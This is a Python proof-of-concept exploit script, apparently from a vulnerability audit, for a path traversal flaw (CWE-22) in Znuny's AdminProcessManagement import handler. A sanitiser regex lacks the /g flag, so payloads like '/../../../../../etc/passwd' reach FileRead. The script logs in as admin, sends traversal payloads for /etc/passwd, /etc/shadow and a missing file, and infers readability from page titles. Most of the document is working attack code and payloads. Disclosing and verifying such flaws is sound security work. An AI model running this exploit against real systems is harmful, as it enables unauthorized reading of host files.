#!/usr/bin/env python3
r"""
VULN-007 — Broken `../` filter in AdminProcessManagement → arbitrary host file read
============================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AdminProcessManagement.pm:109,146-147
Vulnerability   : CWE-22 Path Traversal (broken sanitiser) crossing app→host FS boundary

Flaw (plain English)
--------------------
The "import example process" handler takes the attacker-controlled `ExampleProcess`
parameter and tries to strip traversal with:

    $ExampleProcessFilename =~ s{/+|\.{2,}}{}smx;   # remove slashes and ..   (line 109)

The substitution has **no `/g` flag**, so it removes only the *first* match of the
`/+ | ..` alternation. For an input beginning with a slash, that first match is the
single leading `/`, and every `../` after it survives untouched. The (untrusted)
value is then used verbatim in:

    FileRead(Location => "$Home/var/processes/examples/$ExampleProcessFilename")  (line 146)

The `.yml$` regex at line 118 only feeds the optional `_pre.pm` require path — it is
*not* enforced on the FileRead — so any file, any extension, is read as the web user.

Exploitation idea
------------------
`ExampleProcess=/../../../../../etc/passwd` → after the buggy filter →
`../../../../../etc/passwd` → FileRead escapes to `/etc/passwd`.

Oracle (the read is provable even though raw content is not echoed):
  * file readable + not process-YAML  → "Error - Admin - Znuny" screen
  * file missing OR not readable       → "Fatal Error - Frontend - Znuny" ("Could not read")
  * file readable + valid process YAML → "Process Management - Admin" (imported)

A successful run shows /etc/passwd (world-readable) yields the *readable* screen while
/etc/shadow (present but NOT readable by www-data) and a nonexistent path both yield the
*unreadable* screen — proving FileRead genuinely reaches arbitrary host paths with the
web user's privileges. That is an arbitrary-file-read primitive (readability oracle;
full-content exfil only for files that parse as process YAML).
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def screen(body):
    m = re.search(r"<title>([^<]*)</title>", body)
    return (m.group(1).strip() if m else "?")

def main():
    C.banner("VULN-007", "Broken ../ filter → admin arbitrary host file read",
             ["hitting AdminProcessManagement;ProcessImport — ExampleProcess filter lacks /g (line 109)",
              "sink: Main::FileRead($Home/var/processes/examples/$ExampleProcessFilename) (line 146)"])

    # --- precondition: an admin session (the only auth this needs) ---------
    log = C.log
    log("SETUP", f"logging in as admin {C.ADMIN_USER} (admin-group operator)")
    a = C.agent_client(C.ADMIN_USER, C.ADMIN_PASS)
    tok, _ = a.refresh_token(C.AGENT_URL + "?Action=AdminProcessManagement")
    if not tok:
        C.failed("could not obtain ChallengeToken for AdminProcessManagement")
    log("INFO", f"ChallengeToken = {tok}")

    # 5x ../ climbs from /opt/znuny/var/processes/examples/ to / then into the target.
    TRAV = "/../../../../../"
    cases = {
        "passwd":  TRAV + "etc/passwd",       # world-readable  -> should be READABLE
        "shadow":  TRAV + "etc/shadow",       # exists, root-only -> UNREADABLE (perm denied)
        "missing": TRAV + "etc/zzz_%s" % C.rid(),  # nonexistent   -> UNREADABLE
    }
    results = {}
    raw = {}
    for name, payload in cases.items():
        # ExampleProcess is passed straight into the broken filter then FileRead.
        log("STEP", f"POST ProcessImport ExampleProcess={payload}")
        r = a.post(data={"Action": "AdminProcessManagement", "Subaction": "ProcessImport",
                         "ChallengeToken": tok, "ExampleProcess": payload})
        title = screen(r.text)
        results[name] = title
        raw[name] = r.text
        state = "READABLE" if title.startswith("Error - Admin") else \
                ("IMPORTED" if title.startswith("Process Management") else "UNREADABLE")
        log("PROOF", f"{name:8s} -> '{title}'  => {state}")

    # save request/response evidence
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("POST /znuny/index.pl HTTP/1.1\r\nHost: localhost:25114\r\n"
                "Cookie: OTRSAgentInterface=<admin-session>\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                f"Action=AdminProcessManagement&Subaction=ProcessImport&ChallengeToken={tok}"
                f"&ExampleProcess=%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\r\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("=== /etc/passwd (readable) ===\n<title>%s</title>\n\n"
                "=== /etc/shadow (present, not readable by www-data) ===\n<title>%s</title>\n\n"
                "=== nonexistent ===\n<title>%s</title>\n" %
                (results["passwd"], results["shadow"], results["missing"]))

    # --- the security assertion ------------------------------------------
    passwd_readable = results["passwd"].startswith("Error - Admin")
    shadow_blocked  = results["shadow"].startswith("Fatal Error")
    missing_blocked = results["missing"].startswith("Fatal Error")

    if passwd_readable and shadow_blocked and missing_blocked:
        C.confirmed("traversal escapes var/processes/examples/: /etc/passwd is READ "
                    "(readable screen) while /etc/shadow (perm-denied) and a nonexistent "
                    "path both return 'Could not read' — an arbitrary host file-read "
                    "reachability oracle as admin, crossing the app→host boundary.")
    else:
        C.failed(f"differential not observed: passwd={results['passwd']!r} "
                 f"shadow={results['shadow']!r} missing={results['missing']!r}")

if __name__ == "__main__":
    main()
